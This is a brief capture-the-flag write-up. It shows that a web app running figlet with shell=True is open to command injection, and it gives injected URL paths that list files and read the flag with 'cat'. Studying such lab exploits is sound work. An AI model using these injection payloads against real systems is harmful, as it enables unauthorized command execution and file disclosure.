Looking at the source code, we see that the figlet command is run via:
`subprocess.run(command, shell=True, ...)`
Because `shell=True`, the command is executed through a shell, which makes it vulnerable to command injection. To exploit this, the attacker can escape the `figlet` command using a semicolon (`;`).
Navigating to `/figlet/hello;ls`, we get the following output:

```
 _          _ _
| |__   ___| | | ___
| '_ \ / _ \ | |/ _ \
| | | |  __/ | | (_) |
|_| |_|\___|_|_|\___/

app.py
requirements.txt
templates
sus
```

The suspicious folder `sus` likely contains the flag. Trying `/figlet/hello;ls sus` confirms it.
Finally, we can extract the flag by navigating to:
`/figlet/hello;cd sus && cat flag.txt`
